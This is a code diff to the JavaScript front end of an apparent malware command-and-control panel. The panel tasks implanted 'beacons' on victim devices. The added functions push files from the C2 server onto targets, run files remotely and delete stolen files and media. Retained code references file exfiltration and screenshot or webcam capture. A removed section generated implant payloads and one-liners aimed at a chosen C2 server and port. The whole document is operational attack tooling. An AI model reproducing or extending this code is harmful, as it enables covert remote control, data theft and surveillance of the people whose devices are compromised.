@@ -271,7 +271,8 @@ function fmToggle() {
     if (!document.getElementById('fm-in')) {
         document.getElementById('fm-pb').innerHTML = fmPB('/') +
             ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
-            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
+            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
+            ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
         document.getElementById('fm-body').innerHTML = '<div class="fm-nf">Enter a path and press Enter, or click Go.</div>';
     }
 }
@@ -298,12 +299,14 @@ async function fmInit(uuid) {
         fmRender(cached.entries, '/');
         document.getElementById('fm-pb').innerHTML = fmPB('/') +
             ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
-            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
+            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
+            ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
     } else {
         document.getElementById('fm-body').innerHTML = '<div class="fm-ld"><div class="sp"></div> Browsing...</div>';
         document.getElementById('fm-pb').innerHTML = fmPB('/') +
             ' <input id="fm-in" value="/" onkeydown="if(event.key===\'Enter\')fmGo()" style="flex:1;min-width:60px">' +
-            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>';
+            ' <button class="btn btn-xs btn-gh" onclick="fmRefresh()">&#8635;</button>' +
+            ' <button class="btn btn-xs btn-b" onclick="fmUploadToTarget()">&#11015; Upload</button>';
         fmSendBrowse(uuid, '/');
     }
 }
@@ -404,6 +407,7 @@ function fmRender(entries, path) {
         if (e.type === 'file') {
             html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();fmReadFile(\'' + es(fullPath) + '\')">Read</button>';
             html += '<button class="btn btn-xs btn-b" onclick="event.stopPropagation();fmDownload(\'' + es(fullPath) + '\',\'' + es(e.name) + '\')">DL</button>';
+            html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmRun(\'' + es(fullPath) + '\')">&#9654; Run</button>';
         }
         html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmProp(\'' + es(fullPath) + '\',\'' + es(e.type) + '\',' + (e.size || 0) + ',\'' + es(e.perms || '') + '\',\'' + es(e.modified || '') + '\')">Info</button>';
         html += '<button class="btn btn-xs btn-r" onclick="event.stopPropagation();if(confirm(\'Delete ' + es(e.name) + '?\'))fmDelete(\'' + es(fullPath) + '\')">Del</button>';
@@ -468,6 +472,54 @@ async function fmDownload(path, name) {
     const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'upload ' + path });
     if (r && r.status === 'created') {
         fmPollAction(SEL, r.task_id, 0, path, 'downloaded');
+    } else { tA(SEL, 'r', 'Failed to send upload command'); }
+}
+
+async function fmRun(path) {
+    if (!SEL) return;
+    tA(SEL, 'g', '$ run ' + path);
+    tA(SEL, 's', 'Running...');
+    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'run ' + path });
+    if (r && r.status === 'created') {
+        fmPollAction(SEL, r.task_id, 0, path, 'started');
+    } else { tA(SEL, 'r', 'Failed to send run command'); }
+}
+
+async function fmUploadToTarget() {
+    if (!SEL || !FM_PATH) { tm('Select a device and path first', 1); return; }
+    const files = _fileCache || [];
+    if (!files.length) { tm('No files on C2 server. Upload one first.', 1); return; }
+    let m = document.getElementById('fm-utm');
+    if (!m) {
+        m = document.createElement('div'); m.id = 'fm-utm'; m.className = 'modal';
+        m.innerHTML = '<div class="modal-c" style="max-width:450px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b style="font-size:12px">&#11015; Upload to Target</b><button class="btn btn-xs btn-gh" onclick="this.closest(\'.modal\').classList.remove(\'on\')">&#10005;</button></div><div id="fm-utm-c"></div></div>';
+        document.body.appendChild(m);
+    }
+    m.classList.add('on');
+    const mc = document.getElementById('fm-utm-c');
+    let list = files.map((f, i) => '<label style="display:block;padding:4px 6px;border-bottom:1px solid var(--border);cursor:pointer"><input type="radio" name="fmf" value="' + f.id + '" data-name="' + es(f.filename) + '" ' + (i===0?'checked':'') + '> <span style="font-size:12px">' + es(f.filename) + '</span> <span style="font-size:10px;color:var(--text2)">(id:' + f.id + ')</span></label>').join('');
+    list += '<div style="margin-top:8px;display:flex;gap:6px;align-items:center"><input id="fm-utm-name" value="" placeholder="filename (optional)" style="flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:5px 8px;color:var(--text);font-size:11px"><button class="btn btn-g" onclick="fmDoUpload()">Upload</button></div>';
+    mc.innerHTML = list;
+    // pre-fill name with selected file's name
+    document.querySelectorAll('input[name="fmf"]').forEach(el => el.addEventListener('change', () => {
+        document.getElementById('fm-utm-name').value = el.dataset.name;
+    }));
+    const checked = document.querySelector('input[name="fmf"]:checked');
+    if (checked) document.getElementById('fm-utm-name').value = checked.dataset.name;
+}
+
+async function fmDoUpload() {
+    const sel = document.querySelector('input[name="fmf"]:checked');
+    if (!sel) { tm('Select a file', 1); return; }
+    const fid = sel.value;
+    const name = document.getElementById('fm-utm-name').value.trim() || sel.dataset.name;
+    const targetPath = (FM_PATH === '/' ? '' : FM_PATH) + '/' + name;
+    document.getElementById('fm-utm').classList.remove('on');
+    tA(SEL, 'g', '$ download ' + fid + ' ' + targetPath);
+    tA(SEL, 's', 'Uploading to target...');
+    const r = await ApiClient.post('task', { beacon_uuid: SEL, command: 'download ' + fid + ' ' + targetPath });
+    if (r && r.status === 'created') {
+        fmPollAction(SEL, r.task_id, 0, targetPath, 'uploaded');
     } else { tA(SEL, 'r', 'Failed to send upload command'); }
 }
 
@@ -657,8 +709,15 @@ async function loadBF(uuid) {
     const f = await ApiClient.get('files', { beacon_uuid: uuid });
     if (!f || !f.length) { el.innerHTML = '<div style="color:var(--text2);font-size:11px">No files.</div>'; return; }
     el.innerHTML = '<table><thead><tr><th>File</th><th>Size</th><th>Date</th><th></th></tr></thead><tbody>' +
-        f.map(x => '<tr><td style="font-family:monospace;font-size:10px">' + es(x.filename) + '</td><td>' + (x.size > 1024 ? (x.size / 1024).toFixed(1) + 'K' : x.size + 'B') + '</td><td style="font-size:9px">' + es((x.created_at || '').substring(5, 16)) + '</td><td><a href="api.php?action=file&id=' + x.id + '" download class="btn btn-xs btn-b" style="text-decoration:none">dl</a></td></tr>').join('') +
+        f.map(x => '<tr><td style="font-family:monospace;font-size:10px">' + es(x.filename) + '</td><td>' + (x.size > 1024 ? (x.size / 1024).toFixed(1) + 'K' : x.size + 'B') + '</td><td style="font-size:9px">' + es((x.created_at || '').substring(5, 16)) + '</td><td><a href="api.php?action=file&id=' + x.id + '" download class="btn btn-xs btn-b" style="text-decoration:none">dl</a> <button class="btn btn-xs btn-r" onclick="event.stopPropagation();delFile(' + x.id + ',\'file\')" title="Delete">x</button></td></tr>').join('') +
         '</tbody></table>';
+}
+
+async function delFile(id, type) {
+    if (!confirm('Delete this ' + type + '?')) return;
+    const r = await ApiClient.post('delete_upload', { id: id, type: type });
+    if (r && r.status === 'deleted') { tm('Deleted', 0); if (SEL) { loadBF(SEL); loadBM(SEL); } }
+    else tm('Delete failed', 1);
 }
 
 async function loadBM(uuid) {
@@ -666,7 +725,7 @@ async function loadBM(uuid) {
     const m = await ApiClient.get('media', { beacon_uuid: uuid });
     document.getElementById('mcn').textContent = m && m.length ? '(' + m.length + ')' : '';
     if (!m || !m.length) { el.innerHTML = '<div style="color:var(--text2);font-size:11px">Send screenshot or cam command.</div>'; return; }
-    el.innerHTML = '<div class="mg">' + m.map(x => '<div class="mi" onclick="showM(' + x.id + ')"><img src="api.php?action=media&id=' + x.id + '" loading="lazy" onerror="this.remove()"><div class="mi2">' + es(x.type) + '</div></div>').join('') + '</div>';
+    el.innerHTML = '<div class="mg">' + m.map(x => '<div class="mi" onclick="showM(' + x.id + ')"><img src="api.php?action=media&id=' + x.id + '" loading="lazy" onerror="this.remove()"><div class="mi2">' + es(x.type) + ' <button class="btn btn-xs btn-r" onclick="event.stopPropagation();delFile(' + x.id + ',\'media\')" style="font-size:8px;padding:1px 4px">x</button></div></div>').join('') + '</div>';
 }
 
 function showM(id) {
@@ -925,123 +984,7 @@ async function ref() {
     }
 }
 
-// -- Payload Tab --
-async function showPayloadTab() {
-    await ApiClient.syncCsrf();
-    const m = document.getElementById('pym');
-    const mc = document.getElementById('pym-c');
-    mc.innerHTML = '<div style="padding:14px;display:flex;flex-direction:column;height:100%"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-shrink:0"><b style="font-size:14px">&#9889; Payload Generator</b><button class="btn btn-xs btn-gh" onclick="document.getElementById(\'pym\').classList.remove(\'on\')">&#10005;</button></div><div id="pym-b" style="flex:1;overflow-y:auto"></div></div>';
-    m.classList.add('on');
-    const el = document.getElementById('pym-b');
-    el.innerHTML = '<div class="fm-ld"><div class="sp"></div> Loading...</div>';
-    const r = await ApiClient.get('payloads');
-    if (!r) { el.innerHTML = '<div class="fm-nf">Failed to load.</div>'; return; }
-    renderPayloadView(el, r);
-}
 
-function renderPayloadView(el, r) {
-    const templates = r.templates || [];
-    const saved = r.saved || [];
-    let html = '<div class="rw" style="margin-bottom:12px"><div class="cl"><div class="cd"><div class="ch">&#9889; Generate New</div><div class="cb">';
-    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">';
-    html += '<div><label class="py-l">Type</label><select id="py-type" class="py-s">' + templates.map(t => '<option value="' + t.key + '">' + es(t.name) + '</option>').join('') + '</select></div>';
-    html += '<div><label class="py-l">C2 Server</label><input id="py-c2" value="' + es(window.location.hostname) + '" class="py-s"></div>';
-    html += '<div><label class="py-l">Port</label><input id="py-port" value="' + (window.location.port || '80') + '" class="py-s"></div>';
-    html += '<div style="display:flex;align-items:flex-end;gap:4px"><button class="btn btn-g" onclick="generatePayload()" style="flex:1">&#9889; Generate</button><button class="btn btn-b" onclick="savePayloadModal()" id="py-save-btn" style="display:none">&#128190; Save</button></div>';
-    html += '</div></div></div></div></div>';
-    if (saved.length) {
-        html += '<div class="cd"><div class="ch">&#128190; Saved Payloads <span style="font-weight:400;color:var(--text2)">(' + saved.length + ')</span></div><div class="cb" style="padding:6px">';
-        saved.forEach(p => {
-            const tmpl = templates.find(t => t.key === p.type);
-            const ext = tmpl ? tmpl.ext : '.txt';
-            html += '<div class="py-item"><div><div style="font-size:12px;font-weight:600">' + es(p.name) + '</div><div style="font-size:9px;color:var(--text2)">' + es(p.type) + ' &middot; ' + es(p.c2_server) + ':' + es(p.port) + ' &middot; ' + ((p.created_at || '').substring(0, 16) || '') + '</div></div><div style="display:flex;gap:3px;flex-shrink:0">';
-            html += '<button class="btn btn-xs btn-g" onclick="downloadPayload(\'' + es(p.content) + '\',\'' + es(p.name) + ext + '\')">DL</button>';
-            html += '<button class="btn btn-xs btn-gh" data-preview="' + btoa(p.content) + '" onclick="previewPayload(atob(this.dataset.preview),this)">View</button>';
-            html += '<button class="btn btn-xs btn-r" onclick="deletePayload(' + p.id + ')">Del</button>';
-            html += '</div></div>';
-        });
-        html += '</div></div>';
-    } else {
-        html += '<div style="text-align:center;padding:20px;color:var(--text2);font-size:11px">No saved payloads. Generate one above.</div>';
-    }
-    html += '<div id="py-preview" style="display:none;margin-top:12px"><div class="cd"><div class="ch">&#128221; Generated Code <span id="py-preview-fn" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="document.getElementById(\'py-preview\').style.display=\'none\'">&#10005;</button> <button class="btn btn-xs btn-g" onclick="copyPayloadCode()">Copy</button></div><div class="cb" style="padding:6px"><pre class="fm-read" id="py-preview-c" style="max-height:400px"></pre></div></div></div>';
-    html += '<div id="py-oneliner" style="display:none;margin-top:8px"><div class="cd"><div class="ch">&#128221; One-Liner Command <button class="btn btn-xs btn-g" onclick="copyPayloadOneLiner()">Copy</button></div><div class="cb" style="padding:6px"><pre class="fm-read" id="py-oneliner-c" style="font-size:11px;background:var(--bg);padding:8px"></pre></div></div></div>';
-    el.innerHTML = html;
-}
-
-async function generatePayload() {
-    const type = document.getElementById('py-type').value;
-    const c2 = document.getElementById('py-c2').value.trim();
-    const port = document.getElementById('py-port').value.trim() || '80';
-    const el = document.getElementById('py-preview');
-    const ec = document.getElementById('py-preview-c');
-    const ef = document.getElementById('py-preview-fn');
-    if (!c2) { tm('C2 server required', 1); return; }
-    const r = await ApiClient.post('payload_generate', { type, c2_server: c2, port });
-    if (!r || !r.code) { tm('Generation failed', 1); return; }
-    ec.textContent = r.code;
-    ef.textContent = r.filename;
-    document.getElementById('py-save-btn').style.display = 'inline-block';
-    el.style.display = 'block';
-    el.scrollIntoView({ behavior: 'smooth' });
-    window._pyLast = { type, c2_server: c2, port, code: r.code };
-    if (r.oneliner) {
-        const ol = document.getElementById('py-oneliner');
-        document.getElementById('py-oneliner-c').textContent = r.oneliner;
-        ol.style.display = 'block';
-    }
-    window._pyOneLiner = r.oneliner || '';
-}
-
-function copyPayloadCode() {
-    const c = document.getElementById('py-preview-c');
-    if (!c) return;
-    navigator.clipboard.writeText(c.textContent).then(() => tm('Code copied!')).catch(() => tm('Copy failed', 1));
-}
-
-function copyPayloadOneLiner() {
-    const t = window._pyOneLiner;
-    if (!t) return;
-    navigator.clipboard.writeText(t).then(() => tm('One-liner copied!')).catch(() => tm('Copy failed', 1));
-}
-
-function savePayloadModal() {
-    const data = window._pyLast;
-    if (!data) { tm('Generate a payload first', 1); return; }
-    const name = prompt('Name this payload:', 'payload_' + data.type);
-    if (!name || !name.trim()) return;
-    savePayload(name.trim(), data.type, data.c2_server, data.port, data.code);
-}
-
-async function savePayload(name, type, c2, port, code) {
-    const r = await ApiClient.post('payload', { name, type, c2_server: c2, port });
-    if (r && r.status === 'created') { tm('Payload saved'); showPayloadTab(); }
-    else tm('Failed to save', 1);
-}
-
-async function deletePayload(id) {
-    if (!confirm('Delete this payload?')) return;
-    const r = await ApiClient.post('payload_delete', { id });
-    if (r && r.status === 'ok') { tm('Deleted'); showPayloadTab(); }
-    else tm('Failed to delete', 1);
-}
-
-function downloadPayload(content, filename) {
-    const blob = new Blob([content], { type: 'text/plain' });
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = filename;
-    a.click();
-    URL.revokeObjectURL(a.href);
-    tm('Downloading ' + filename);
-}
-
-function previewPayload(content, btn) {
-    const el = document.getElementById('py-preview');
-    const ec = document.getElementById('py-preview-c');
-    const ef = document.getElementById('py-preview-fn');
-    if (el && ec) { ec.textContent = content; ef.textContent = '(viewing)'; el.style.display = 'block'; }
-}
 
 // Start: load initial data, then poll gently
 ref();
